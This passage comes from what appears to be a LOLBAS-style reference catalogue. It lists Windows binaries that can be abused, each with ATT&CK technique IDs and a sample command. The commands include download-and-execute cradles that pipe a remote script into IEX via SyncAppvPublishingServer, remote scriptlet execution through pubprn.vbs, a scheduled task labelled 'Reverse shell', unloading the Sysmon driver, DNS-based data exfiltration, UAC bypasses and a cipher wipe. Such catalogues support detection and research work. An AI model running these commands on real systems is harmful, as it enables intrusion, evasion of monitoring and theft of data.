#### Pcwrun.exe
Program Compatibility Wizard
**Categories:** Execute, T1202, T1218
```
Pcwrun.exe {PATH_ABSOLUTE:.exe}
```

#### Pcwutl.dll
Microsoft HTML Viewer
**Categories:** Execute, T1218.011
```
rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}
```

#### Pester.bat
Used as part of the Powershell pester
**Categories:** Execute, T1216
```
Pester.bat [/help|?|-?|/?] "$null; {CMD}"
```

#### Pixtool.exe
Command line utility for taking and analyzing PIX GPU captures.
**Categories:** Execute, T1127
```
pixtool.exe launch {PATH_ABSOLUTE:.exe}
```

#### Pnputil.exe
Used for installing drivers
**Categories:** Execute, T1547
```
pnputil.exe -i -a {PATH_ABSOLUTE:.inf}
```

#### Powershell.exe
Powershell.exe is a a task-based command-line shell built on .NET.
**Categories:** Execute, T1059.001
```
powershell.exe -ep bypass -file c:\path\to\a\script.ps1
```

#### Procdump.exe
SysInternals Memory Dump Tool
**Categories:** Execute, T1202
```
procdump.exe -md {PATH:.dll} explorer.exe
```

#### Provlaunch.exe
Launcher process
**Categories:** Execute, T1218
```
provlaunch.exe LOLBin
```

#### Pubprn.vbs
Proxy execution with Pubprn.vbs
**Categories:** Execute, T1216.001
```
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

#### Query.exe
Remote Desktop Services MultiUser Query Utility
**Categories:** Execute, T1218
```
query.exe user
```

#### Rasautou.exe
Windows Remote Access Dialer
**Categories:** Execute, T1218
```
rasautou -d {PATH:.dll} -p export_name -a a -e e
```

#### Register-cimprovider.exe
Used to register new wmi providers
**Categories:** Execute, T1218
```
Register-cimprovider -path {PATH_ABSOLUTE:.dll}
```

#### Reset.exe
Remote Desktop Services Reset Utility
**Categories:** Execute, T1218
```
reset.exe session
```

#### Runexehelper.exe
Launcher process
**Categories:** Execute, T1218
```
runexehelper.exe {PATH_ABSOLUTE:.exe}
```

#### Runonce.exe
Executes a Run Once Task that has been configured in the registry
**Categories:** Execute, T1218
```
Runonce.exe /AlternateShellStartup
```

#### Runscripthelper.exe
Execute target PowerShell script
**Categories:** Execute, T1218
```
runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}
```

#### Schtasks.exe
Schedule periodic tasks
**Categories:** Execute, T1053.005
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
```

#### Scriptrunner.exe
Execute binary through proxy binary to evade defensive counter measures
**Categories:** Execute, T1202, T1218
```
Scriptrunner.exe -appvscript {PATH:.exe}
```

#### Setres.exe
Configures display settings
**Categories:** Execute, T1218
```
setres.exe -w 800 -h 600
```

#### SettingSyncHost.exe
Host Process for Setting Synchronization
**Categories:** Execute, T1218
```
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}
```

#### Sftp.exe
sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer fi...
**Categories:** Execute, T1202
```
sftp -o ProxyCommand="{CMD}" .
```

#### Shdocvw.dll
Shell Doc Object and Control Library.
**Categories:** Execute, T1218.011
```
rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}
```

#### Shell32.dll
Windows Shell Common Dll
**Categories:** Execute, T1218.011
```
rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}
```

#### Sigverif.exe
File Signature Verification utility to verify digital signatures of files
**Categories:** Execute, T1218
```
sigverif.exe
```

#### Sqlps.exe
Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershel...
**Categories:** Execute, T1218
```
Sqlps.exe -noprofile
```

#### SQLToolsPS.exe
Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in...
**Categories:** Execute, T1218
```
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}
```

#### ssh.exe
Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Serv...
**Categories:** Execute, T1202
```
ssh localhost "{CMD}"
```

#### Stordiag.exe
Storage diagnostic tool
**Categories:** Execute, T1218
```
stordiag.exe
```

#### SyncAppvPublishingServer.exe
Used by App-v to get App-v server lists
**Categories:** Execute, T1218
```
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

#### Syncappvpublishingserver.vbs
Script used related to app-v and publishing server
**Categories:** Execute, T1216.002
```
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

#### te.exe
Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).
**Categories:** Execute, T1127
```
te.exe {PATH:.wsc}
```

#### Teams.exe
Electron runtime binary which runs the Teams application
**Categories:** Execute, T1218.015
```
teams.exe
```

#### Ttdinject.exe
Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)
**Categories:** Execute, T1127
```
TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "{PATH:.exe}"
```

#### Unregmp2.exe
Microsoft Windows Media Player Setup Utility
**Categories:** Execute, T1202
```
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```

#### Url.dll
Internet Shortcut Shell Extension DLL.
**Categories:** Execute, T1218.011
```
rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}
```

#### UtilityFunctions.ps1
PowerShell Diagnostic Script
**Categories:** Execute, T1216
```
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
```

#### Verclsid.exe
Used to verify a COM object before it is instantiated by Windows Explorer
**Categories:** Execute, T1218.012
```
verclsid.exe /S /C {CLSID}
```

#### VSDiagnostics.exe
Command-line tool used for performing diagnostics.
**Categories:** Execute, T1127
```
VSDiagnostics.exe start 1 /launch:{PATH:.exe}
```

#### Vshadow.exe
VShadow is a command-line tool that can be used to create and manage volume shadow copies.
**Categories:** Execute, T1202
```
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:
```

#### VSIISExeLauncher.exe
Binary will execute specified binary. Part of VS/VScode installation.
**Categories:** Execute, T1218
```
VSIISExeLauncher.exe -p {PATH:.exe} -a "{CMD:args}"
```

#### vsjitdebugger.exe
Just-In-Time (JIT) debugger included with Visual Studio
**Categories:** Execute, T1127
```
Vsjitdebugger.exe {PATH:.exe}
```

#### vsls-agent.exe
Agent for Visual Studio Live Share (Code Collaboration)
**Categories:** Execute, T1218
```
vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}
```

#### Wab.exe
Windows address book manager
**Categories:** Execute, T1218
```
wab.exe
```

#### wbemtest.exe
WMI/WBEM Test Binary
**Categories:** Execute, T1047
```
wbemtest.exe
```

#### WFMFormat.exe
Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.
**Categories:** Execute, T1127
```
WFMFormat.exe
```

#### WinDbg.exe
Windows Debugger for advanced user-mode and kernel-mode debugging.
**Categories:** Execute, T1127
```
windbg.exe -g {CMD}
```

#### winfile.exe
Windows File Manager executable
**Categories:** Execute, T1202
```
winfile.exe {PATH:.exe}
```

#### Wlrmdr.exe
Windows Logon Reminder executable
**Categories:** Execute, T1202
```
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}
```

#### WorkFolders.exe
Work Folders
**Categories:** Execute, T1218
```
WorkFolders
```

#### write.exe
Windows Write
**Categories:** Execute, T1218
```
write.exe
```

#### wt.exe
Windows Terminal
**Categories:** Execute, T1202
```
wt.exe {CMD}
```

#### wuauclt.exe
Windows Update Client
**Categories:** Execute, T1218
```
wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer
```

#### XBootMgr.exe
Windows Performance Toolkit binary used to start performance traces.
**Categories:** Execute, T1202
```
xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -callBack {PATH:.exe}
```

#### XBootMgrSleep.exe
Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transiti...
**Categories:** Execute, T1202
```
xbootmgrsleep.exe 1000 {PATH:.exe}
```

#### Zipfldr.dll
Compressed Folder library
**Categories:** Execute, T1218.011
```
rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}
```

### Reconnaissance

#### Nmcap.exe
Command-line packet capture utility from Microsoft Network Monitor 3.x.
**Categories:** Reconnaissance, T1040
```
nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}
```

#### Pktmon.exe
Capture Network Packets on the windows 10 with October 2018 Update or later.
**Categories:** Reconnaissance, T1040
```
pktmon.exe start --etw
```

#### Psr.exe
Windows Problem Steps Recorder, used to record screen and clicks.
**Categories:** Reconnaissance, T1113
```
psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0
```

### T1048

#### TestWindowRemoteAgent.exe
TestWindowRemoteAgent.exe is the command-line tool to establish RPC
**Categories:** T1048, Upload
```
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

### T1485

#### Cipher.exe
File Encryption Utility
**Categories:** T1485, T1562, Tamper
```
cipher /w:{PATH_ABSOLUTE:folder}
```

### T1548.002

#### ComputerDefaults.exe
ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, email...
**Categories:** T1548.002, UAC Bypass
```
ComputerDefaults.exe
```

#### Eudcedit.exe
Private Character Editor Windows Utility
**Categories:** T1548.002, UAC Bypass
```
eudcedit
```

#### Eventvwr.exe
Displays Windows Event Logs in a GUI window.
**Categories:** T1548.002, UAC Bypass
```
eventvwr.exe
```

#### iscsicpl.exe
Microsoft iSCSI Initiator Control Panel tool
**Categories:** T1548.002, UAC Bypass
```
c:\windows\syswow64\iscsicpl.exe
```

#### odbcad32.exe
ODBC Data Source Administrator to manage User/System DSNs and ODBC drivers.
**Categories:** T1548.002, UAC Bypass
```
odbcad32.exe
```

#### Wsreset.exe
Used to reset Windows Store settings according to its manifest file
**Categories:** T1548.002, UAC Bypass
```
wsreset.exe
```

### T1562.001

#### fltMC.exe
Filter Manager Control Program used by Windows
**Categories:** T1562.001, Tamper
```
fltMC.exe unload SysmonDrv
```

### T1567

#### DataSvcUtil.exe
DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed...
**Categories:** T1567, Upload
```
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
```
